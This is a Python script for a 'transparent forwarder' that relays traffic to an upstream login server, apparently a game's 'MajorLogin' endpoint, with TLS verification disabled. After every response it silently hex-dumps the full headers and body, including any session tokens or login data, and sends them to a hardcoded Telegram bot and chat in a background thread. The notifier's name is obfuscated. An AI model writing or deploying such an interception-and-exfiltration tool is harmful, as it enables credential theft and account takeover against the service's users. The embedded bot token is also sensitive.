#!/usr/bin/env python3
"""
Fully transparent forwarder + Telegram hex-dump notifier.

  Request  : client method + path + headers + body  ->  upstream verbatim
  Response : upstream status + headers + body      ->  client verbatim

Additionally, after every upstream response, the raw response body is
hex-dumped and sent to a Telegram chat via a bot (fire-and-forget, in a
background thread so it never slows down the client).
"""
import sys
import os
import time
import threading
import warnings
import socketserver
warnings.filterwarnings("ignore")
import requests
requests.packages.urllib3.disable_warnings()
from http.server import HTTPServer, BaseHTTPRequestHandler

C = "\033[1;36m"; G = "\033[1;32m"; R = "\033[1;31m"
Y = "\033[1;33m"; W = "\033[1;37m"; S = "\033[0m"

UPSTREAM    = "https://loginbp.ppmainecoonghj.com"
LISTEN_PORT = 5030

# ---------- TELEGRAM CONFIG ----------
# Set these via environment variables or edit directly.
#   TELEGRAM_BOT_TOKEN = "123456:ABC-DEF..."
#   TELEGRAM_CHAT_ID   = "123456789"   (user id or -100... group id)
TG_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8677901038:AAEUAHl7wiUxzivL0khjPdMIQtYSas5Gijg")
TG_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID",   "5440792907")
TG_ENABLED   = bool(TG_BOT_TOKEN and TG_CHAT_ID)

# hop-by-hop headers (RFC 7230 §6.1) — MUST NOT be forwarded either way
HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade",
}
REQ_DROP = HOP | {"host", "content-length"}


# ---------- TELEGRAM HELPERS ----------
def _hexdump(data: bytes, width: int = 16) -> str:
    """Pretty 16-byte-per-row hex dump with offset column."""
    lines = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hexpart = " ".join(f"{b:02X}" for b in chunk)
        # pad so columns line up on the last row
        hexpart = hexpart.ljust(width * 3 - 1)
        asciipart = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{i:08X}  {hexpart}  |{asciipart}|")
    return "\n".join(lines)


def _tg_send(text: str) -> None:
    """Send a single text message (auto-split if >4096 chars)."""
    if not TG_ENABLED:
        return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    limit = 4000  # stay under 4096
    for i in range(0, len(text), limit):
        chunk = text[i:i + limit]
        try:
            requests.post(
                url,
                data={"chat_id": TG_CHAT_ID, "text": chunk},
                timeout=10,
                verify=False,
            )
        except Exception as e:
            print(R + f"  [!] Telegram send failed: {e}" + S)


def nOtIfYtElEgRaM(method: str, path: str,
                   status: int, reason: str,
                   headers: dict, body: bytes) -> None:
    """Background fire-and-forget notifier."""
    if not TG_ENABLED:
        return

    def _worker():
        try:
            hdr_txt = "\n".join(f"{k}: {v}" for k, v in headers.items())
            msg = (
                "🛰 MajorLogin response\n"
                f"{method} {path}\n"
                f"Status: {status} {reason}\n"
                f"Body: {len(body)} bytes\n"
                f"──── headers ────\n{hdr_txt}\n"
                f"──── body (hex) ────\n"
                f"{_hexdump(body) if body else '(empty)'}"
            )
            _tg_send(msg)
        except Exception as e:
            print(R + f"  [!] Telegram worker error: {e}" + S)

    threading.Thread(target=_worker, daemon=True).start()


# ---------- HTTP FORWARDER ----------
class ThreadingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads  = True
    allow_reuse_address = True


class ForwardHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):     self._forward()
    def do_POST(self):    self._forward()
    def do_PUT(self):     self._forward()
    def do_DELETE(self):  self._forward()
    def do_HEAD(self):    self._forward()
    def do_OPTIONS(self): self._forward()
    def do_PATCH(self):   self._forward()

    def _forward(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body   = self.rfile.read(length) if length else None

        fwd_headers = {
            k: v for k, v in self.headers.items()
            if k.lower() not in REQ_DROP
        }

        try:
            r = requests.request(
                method          = self.command,
                url             = UPSTREAM + self.path,
                headers         = fwd_headers,
                data            = body,
                verify          = False,
                timeout         = 30,
                allow_redirects = False,
                stream          = True,
            )
            r.raw.decode_content = False
            raw = r.raw.read()
        except Exception as e:
            print(R + f"  ✗ upstream error: {e}" + S)
            return self._empty(502)

        print(C + f"  → {self.command} {self.path}  ({len(body) if body else 0} B)"
              + G + f"   ← {r.status_code} ({len(raw)} B)" + S)

        # ---- fire-and-forget TG notification (does not block client) ----
        nOtIfYtElEgRaM(self.command, self.path, r.status_code, r.reason,
                       dict(r.headers), raw)

        # ---- return exact server response ----
        self.send_response_only(r.status_code, r.reason)

        has_content_length = False
        for k, v in r.headers.items():
            lk = k.lower()
            if lk in HOP:
                continue
            if lk == "content-length":
                has_content_length = True
            self.send_header(k, v)

        if not has_content_length and self.command != "HEAD":
            self.send_header("Content-Length", str(len(raw)))

        self.end_headers()

        if self.command != "HEAD" and raw:
            try:
                self.wfile.write(raw)
            except Exception:
                pass

    def _empty(self, code: int):
        self.send_response(code)
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "close")
        self.end_headers()

    def log_message(self, *args):
        pass


# ---------- BOOTSTRAP ----------
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(W + r"""
        ██████╗ ██╗██╗   ██╗ █████╗ ███╗   ██╗
        ██╔══██╗██║██║   ██║██╔══██╗████╗  ██║
        ██║  ██║██║██║   ██║███████║██╔██╗ ██║
        ██║  ██║██║╚██╗ ██╔╝██╔══██║██║╚██╗██║
        ██████╔╝██║ ╚████╔╝ ██║  ██║██║ ╚████║
        ╚═════╝ ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝
    """ + S)
    print(C + "        " + "═" * 55 + S)
    print(Y + "        Transparent forwarder  +  Telegram hex notifier" + S)
    print(C + "        " + "═" * 55 + S + "\n")


if __name__ == "__main__":
    banner()

    if TG_ENABLED:
        print(G + "        [✓] Telegram notifier: ENABLED" + S)
    else:
        print(Y + "        [!] Telegram notifier: DISABLED "
                  "(set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)" + S)

    print(C + f"        [*] Listening on http://0.0.0.0:{LISTEN_PORT}  →  {UPSTREAM}" + S)
    print(G + "        [✓] Ready. Press Ctrl+C to stop.\n" + S)

    srv = ThreadingHTTPServer(("0.0.0.0", LISTEN_PORT), ForwardHandler)
    srv.handle_error = lambda *a: None
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print(R + "\n        [!] Shutting down." + S)
        srv.shutdown()
        sys.exit(0)
